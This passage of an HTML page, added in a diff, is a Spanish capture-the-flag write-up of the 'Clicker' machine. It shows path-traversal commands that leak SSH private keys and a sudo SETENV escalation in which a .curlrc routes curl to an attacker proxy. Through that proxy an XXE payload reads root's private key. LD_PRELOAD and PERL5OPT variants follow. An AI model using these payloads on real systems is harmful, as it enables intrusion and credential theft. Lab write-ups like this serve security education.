+                <p>Probando la vulnerabilidad, puedo leer archivos arbitrarios usando secuencias de traversal de directorios:</p>
+                <pre><code class="language-bash">./execute_query 5 ../../../etc/passwd</code></pre>
+
+                <p>El binario intenta ejecutar el contenido del archivo como una consulta SQL, y cuando falla, muestra el contenido completo del archivo en el mensaje de error. Este es un vector perfecto de divulgación de información.</p>
+
+                <p>Apuntando a la clave SSH privada de jack:</p>
+                <pre><code class="language-bash">./execute_query 5 ../.ssh/id_rsa</code></pre>
+
+                <p>¡Éxito! El binario muestra la clave SSH privada de jack. Copio la clave a mi máquina local, establezco los permisos correctos:</p>
+                <pre><code class="language-bash">chmod 600 jack_id_rsa</code></pre>
+
+                <p>Y me conecto mediante SSH:</p>
+                <pre><code class="language-bash">ssh -i jack_id_rsa jack@10.10.11.232</code></pre>
+
+                <p>Ahora tengo acceso como <code>jack</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios a Root - Abuso de Variables de Entorno</h2>
+                <p>Comprobando permisos sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>La salida revela privilegios interesantes:</p>
+                <pre><code class="language-plaintext">User jack may run the following commands on clicker:
+    (ALL : ALL) ALL
+    (root) SETENV: NOPASSWD: /opt/monitor.sh</code></pre>
+
+                <p>La etiqueta <code>SETENV</code> es crítica: me permite establecer variables de entorno arbitrarias al ejecutar el script. Examinemos el script:</p>
+                <pre><code class="language-bash">#!/bin/bash
+if [ "$EUID" -ne 0 ]
+then echo "Error, please run as root"
+exit
+fi
+
+set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+unset PERL5LIB;
+unset PERLLIB;
+
+data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
+/usr/bin/xml_pp <<< $data;
+if [[ $NOSAVE == "true" ]]; then
+    exit;
+else
+    timestamp=$(/usr/bin/date +%s)
+    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
+fi</code></pre>
+
+                <p>El script intenta asegurarse de varias maneras:</p>
+                <ul>
+                    <li>Hardcodeando la variable PATH</li>
+                    <li>Eliminando variables de entorno peligrosas de Perl</li>
+                    <li>Usando rutas absolutas para todos los binarios</li>
+                </ul>
+
+                <p>Sin embargo, pasa por alto varios vectores de ataque.</p>
+
+                <h3>Entendiendo la Cadena de Ataque</h3>
+                <p>El script obtiene datos XML de un endpoint web y los procesa con <code>xml_pp</code>, un pretty-printer de XML. La estrategia de ataque implica:</p>
+                <ol>
+                    <li>Abusar de la variable de entorno <code>HOME</code> (no bloqueada por el script)</li>
+                    <li>Crear un archivo de configuración <code>.curlrc</code> malicioso en el directorio HOME controlado</li>
+                    <li>Configurar curl para proxificar peticiones a través de Burp Suite</li>
+                    <li>Interceptar y modificar la respuesta XML para inyectar un payload XXE</li>
+                    <li>Usar XXE para leer archivos sensibles como la clave SSH de root</li>
+                </ol>
+
+                <h3>Configurando el Exploit</h3>
+                <p>Primero, creo un archivo de configuración de curl en el directorio home de jack:</p>
+                <pre><code class="language-bash">cat > /home/jack/.curlrc << EOF
+--proxy http://10.10.16.6:8080
+--show-error
+EOF</code></pre>
+
+                <p>Esto fuerza a curl a enrutar todas las peticiones a través de mi instancia de Burp Suite ejecutándose en el puerto 8080.</p>
+
+                <p>Configuro Burp Suite para escuchar en todas las interfaces en lugar de solo localhost:</p>
+                <p><img src="./media/image1.png"
+                        alt="Configuración del proxy de Burp Suite configurada para escuchar en todas las interfaces en el puerto 8080" />
+                </p>
+
+                <p>Ahora ejecuto el script de monitorización con la variable de entorno HOME modificada:</p>
+                <pre><code class="language-bash">sudo HOME=/home/jack /opt/monitor.sh</code></pre>
+
+                <p>Burp Suite intercepta la petición:</p>
+                <p><img src="./media/image5.png"
+                        alt="Burp Suite mostrando la petición HTTP interceptada al endpoint de diagnóstico" />
+                </p>
+
+                <h3>Inyección de Payload XXE</h3>
+                <p>Hago clic derecho en Burp Suite y habilito la interceptación de respuesta ("Intercept response to this request"). Esto me permite modificar el contenido XML que se devuelve al script.</p>
+
+                <p>Cuando llega la respuesta, la reemplazo con un payload XXE:</p>
+                <p><img src="./media/image8.png"
+                        alt="Burp Suite mostrando la respuesta XML modificada conteniendo el payload XXE" />
+                </p>
+
+                <p>El payload XXE:</p>
+                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "/etc/passwd"&gt;]&gt;
+&lt;file&gt;
+&amp;ent;
+&lt;/file&gt;</code></pre>
+
+                <p>Esto define una entidad externa <code>ent</code> que lee <code>/etc/passwd</code>. Cuando el parser XML procesa <code>&amp;ent;</code>, se expande al contenido del archivo.</p>
+
+                <p>Probando primero con <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">sudo HOME=/home/jack /opt/monitor.sh</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE replace [
+&lt;!ENTITY ent SYSTEM "/etc/passwd"&gt;
+]&gt;
+&lt;file&gt;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+(...)</code></pre>
+
+                <p>¡Perfecto! La explotación XXE funciona. Ahora apunto a la clave SSH privada de root:</p>
+                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "/root/.ssh/id_rsa"&gt;]&gt;
+&lt;file&gt;
+&amp;ent;
+&lt;/file&gt;</code></pre>
+
+                <p>Ejecutando el script de nuevo:</p>
+                <pre><code class="language-bash">sudo HOME=/home/jack /opt/monitor.sh</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE replace [
+&lt;!ENTITY ent SYSTEM "/root/.ssh/id_rsa"&gt;
+]&gt;
+&lt;file&gt;
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQA
+(...)</code></pre>
+
+                <p>Copio la clave privada de root, la guardo localmente con los permisos correctos, y me conecto:</p>
+                <pre><code class="language-bash">chmod 600 root_id_rsa
+ssh -i root_id_rsa root@10.10.11.232</code></pre>
+
+                <p>Ahora tengo acceso root y puedo recuperar la flag de root:</p>
+                <pre><code class="language-bash">root@clicker:~# cat /root/root.txt</code></pre>
+
+                <h2>Métodos Alternativos de Escalada de Privilegios</h2>
+                <p>Tras completar la máquina, investigué soluciones alternativas. El permiso sudo <code>SETENV</code> puede explotarse de múltiples maneras:</p>
+
+                <h3>Método LD_PRELOAD</h3>
+                <p>La variable de entorno <code>LD_PRELOAD</code> permite cargar una biblioteca compartida antes que cualquier otra biblioteca. Creando una biblioteca compartida maliciosa que genera una shell en una función de inicialización y estableciendo <code>LD_PRELOAD</code> para apuntar a ella, se puede conseguir ejecución de código como root cuando se ejecuta cualquier binario SUID.</p>
+
+                <h3>Método PERL5OPT</h3>
+                <p>La variable de entorno <code>PERL5OPT=-d</code> habilita el depurador de Perl. Aunque el script elimina <code>PERL5LIB</code> y <code>PERLLIB</code>, no elimina <code>PERL5OPT</code>. Si se ejecutan scripts de Perl con privilegios elevados (o si puedes influir en qué se ejecuta), el depurador proporciona una shell interactiva con esos privilegios.</p>
+
+                <p>Ambos métodos demuestran el peligro de permitir la manipulación de variables de entorno en configuraciones sudo, incluso cuando se toman otras precauciones como rutas absolutas y hardcoding del PATH.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
